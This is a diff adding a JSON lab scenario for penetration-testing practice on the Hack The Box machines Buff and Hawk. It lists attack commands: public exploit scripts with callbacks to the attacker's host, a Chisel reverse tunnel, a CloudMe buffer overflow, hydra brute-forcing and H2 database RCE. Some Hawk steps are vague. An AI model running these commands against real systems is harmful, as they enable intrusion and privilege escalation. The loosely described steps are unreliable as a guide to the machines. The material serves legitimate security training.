@@ -1,0 +1,204 @@
+{
+  "id": "tunnel-and-escalate",
+  "title": "Tunnel and Escalate",
+  "category": "windows-standalone",
+  "source": ["HTB Buff", "HTB Hawk"],
+  "designed_by": "ai-composite",
+  "description": "Two standalone machines: Buff (Windows) — Gym Management → Chisel tunnel → CloudMe BOF → Administrator. Hawk (Linux) — FTP anon → OpenSSL brute → Drupal creds → H2 database RCE → root.",
+  "introduction": "This scenario teaches tunneling to reach internal services and buffer overflow exploitation. Chisel tunnels are common in OSCP for accessing localhost-only services.",
+  "mental_model": "When a service runs only on localhost, tunnel it: Chisel reverse exposes 127.0.0.1:port to your Kali. Buffer overflows often give full compromise.",
+  "key_principles": [
+    "Chisel reverse tunnel exposes internal ports to Kali",
+    "CloudMe BOF on 8888 requires tunnel from foothold",
+    "FTP anonymous often has encrypted credential files",
+    "OpenSSL enc -d brute decrypts with rockyou",
+    "H2 database console often has RCE as root"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 5,
+    "enumeration_depth": 4,
+    "rabbit_hole_risk": 3,
+    "time_pressure": 4
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1572", "name": "Protocol Tunneling"},
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"},
+      {"id": "T1552.001", "name": "Credentials In Files"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc", "T5-Credentials"],
+
+  "environment": {
+    "machine_count": 2,
+    "network_count": 1,
+    "os_distribution": {"windows": 1, "linux": 1},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "chisel", "cloudme", "buffer-overflow", "gym-management",
+    "drupal", "h2-database", "openssl", "ftp-anonymous",
+    "hydra", "rockyou", "linpeas"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17, 22],
+    "pattern_frequency": "medium",
+    "recommended_order": 9
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "buff",
+      "label": "BUFF",
+      "ip": "10.10.10.198",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 8080,
+          "name": "Gym Management",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "rce", "cve": "EDB-48506", "summary": "Gym Management Software RCE", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "nmap -sV 10.10.10.198",
+            "searchsploit -m 48506",
+            {"cmd": "python3 48506.py http://10.10.10.198:8080 <kali-ip> 443", "rationale": "Why: Gym Management RCE gives initial shell"}
+          ]
+        },
+        {
+          "port": 8888,
+          "name": "CloudMe",
+          "version": "internal",
+          "vulnerabilities": [
+            {"type": "bof", "summary": "CloudMe buffer overflow (via Chisel tunnel)", "leads_to": "Administrator"}
+          ],
+          "commands": [
+            {"cmd": "chisel server -p 8000 --reverse", "rationale": "Why: Reverse tunnel exposes CloudMe 8888 to Kali"},
+            "# On Buff: chisel client <kali-ip>:8000 R:8888:127.0.0.1:8888",
+            "searchsploit cloudme",
+            {"cmd": "python3 48389.py 127.0.0.1 8888", "rationale": "Why: CloudMe BOF gives Administrator shell"}
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "shaun",
+          "to": "Administrator",
+          "technique": "Chisel tunnel → CloudMe 8888 BOF",
+          "commands": [
+            "chisel server -p 8000 --reverse",
+            "# Upload chisel to Buff, run: chisel client <kali>:8000 R:8888:127.0.0.1:8888",
+            {"cmd": "python3 48389.py 127.0.0.1 8888", "rationale": "Why: CloudMe BOF escalates to Administrator"}
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "hawk",
+      "label": "HAWK",
+      "ip": "10.10.10.102",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 21,
+          "name": "FTP",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "FTP anonymous → OpenSSL encrypted files", "leads_to": "brute"}
+          ],
+          "commands": [
+            "ftp 10.10.10.102",
+            "anonymous / anonymous",
+            "mget *",
+            {"cmd": "openssl enc -d -aes-256-cbc -in encrypted.txt -k <password>", "rationale": "Why: Brute password to decrypt cred files"}
+          ]
+        },
+        {
+          "port": 80,
+          "name": "HTTP (Drupal)",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Drupal with creds from OpenSSL decrypted files", "leads_to": "drupal-admin"}
+          ],
+          "commands": [
+            "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.102 http-post-form",
+            "# Or use creds from decrypted FTP files"
+          ]
+        },
+        {
+          "port": 8082,
+          "name": "H2 Database",
+          "version": "internal",
+          "vulnerabilities": [
+            {"type": "rce", "summary": "H2 database RCE (JNDI or similar)", "leads_to": "root"}
+          ],
+          "commands": [
+            "curl http://10.10.10.102:8082",
+            "searchsploit h2 database",
+            "# H2 console RCE or JNDI injection"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "www-data or user",
+          "to": "root",
+          "technique": "H2 database RCE runs as root",
+          "commands": [
+            "linpeas.sh",
+            "# H2 RCE often gives root directly",
+            "python3 h2_rce.py 10.10.10.102 8082"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "drupal-admin", "type": "password", "source": "FTP + OpenSSL decrypt + hydra", "unlocks": ["hawk-drupal"]}
+      ],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {
+      "id": "path-buff",
+      "name": "Buff (Gym Mgmt → Chisel → CloudMe BOF)",
+      "color": "#6bb8cc",
+      "steps": ["buff"],
+      "description": "Gym Management → Chisel tunnel → CloudMe BOF → Administrator"
+    },
+    {
+      "id": "path-hawk",
+      "name": "Hawk (FTP → OpenSSL → Drupal → H2 RCE)",
+      "color": "#e8a87c",
+      "steps": ["hawk"],
+      "description": "FTP anon → OpenSSL brute → Drupal creds → H2 database RCE → root"
+    }
+  ]
+}
